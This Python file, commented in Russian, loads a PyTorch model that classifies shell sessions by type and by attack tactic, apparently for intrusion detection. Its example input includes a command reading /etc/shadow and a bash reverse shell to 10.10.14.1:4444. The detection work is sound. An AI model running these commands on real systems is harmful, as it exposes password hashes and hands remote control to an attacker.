import torch
import json
from sentence_transformers import SentenceTransformer
from models import SessionClassifier

_model = None
_encoder = None
_checkpoint = None
_device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')

def load_model(model_path='../session-classifier.pt'):
    global _model, _encoder, _checkpoint, _device
    if _model is not None:
        return _model, _encoder, _checkpoint

    _encoder = SentenceTransformer('../command-encoder', device=_device)
    _checkpoint = torch.load(model_path, map_location=_device)

    _model = SessionClassifier(
        emb_dim=384,
        num_types=3,
        num_tactics=len(_checkpoint['all_tactics'])
    ).to(_device)
    _model.load_state_dict(_checkpoint['model_state_dict'])
    _model.eval()

    return _model, _encoder, _checkpoint


# Функция predict
def predict_session(commands, max_len=50, threshold=0.5):
    """
    Принимает список строк-команд.
    Возвращает: тип сессии, тактики, вероятности.
    """
    model, encoder, checkpoint = load_model()
    all_tactics = checkpoint['all_tactics']
    type_to_idx = checkpoint['type_to_idx']
    idx_to_type = {v: k for k, v in type_to_idx.items()}

    # Кодируем команды
    if len(commands) > max_len:
        commands = commands[:max_len]

    if commands:
        emb = encoder.encode(commands, convert_to_tensor=True, device=_device)
        if emb.shape[0] < max_len:
            pad = torch.zeros(max_len - emb.shape[0], emb.shape[1], device=_device)
            emb = torch.cat([emb, pad])
    else:
        emb = torch.zeros(max_len, 384, device=_device)

    emb = emb.unsqueeze(0)  # (1, 50, 384) — добавляем batch-ось

    with torch.no_grad():
        out_type, out_tactics = model(emb)

    # Тип сессии
    type_idx = out_type.argmax(1).item()
    session_type = idx_to_type[type_idx]

    # Тактики (только те, где вероятность > 0.5)
    probs = out_tactics[0].tolist()
    tactics = [all_tactics[i] for i, p in enumerate(probs) if p > threshold]

    return {
        'type': session_type,
        'tactics': tactics,
        'probabilities': {all_tactics[i]: round(p, 3) for i, p in enumerate(probs)}
    }


# Пример использования
if __name__ == '__main__':
    test_commands = [
        "whoami",
        "ls -la",
        "cat /etc/shadow",
        "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
    ]

    result = predict_session(test_commands)
    print(json.dumps(result, indent=2, ensure_ascii=False))